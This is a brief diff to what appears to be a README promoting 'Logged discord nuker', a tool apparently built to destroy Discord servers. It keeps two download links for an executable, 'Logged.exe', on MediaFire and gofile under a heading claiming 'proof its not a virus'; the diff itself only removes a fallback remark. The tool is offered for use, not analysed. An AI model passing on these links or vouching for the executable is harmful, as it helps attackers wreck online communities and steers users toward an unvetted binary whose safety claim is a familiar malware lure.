@@ -11,7 +11,7 @@ Logged discord nuker has many features heres just to list some
 
 
 # download link is 
-[mediafire] https://www.mediafire.com/file/j5mnhsmn7kz6293/Logged.exe/file (if this does not work for you try link below)
+[mediafire] https://www.mediafire.com/file/j5mnhsmn7kz6293/Logged.exe/file
 [gofile] https://gofile.io/d/UnZosj
 
 # proof its not a virus
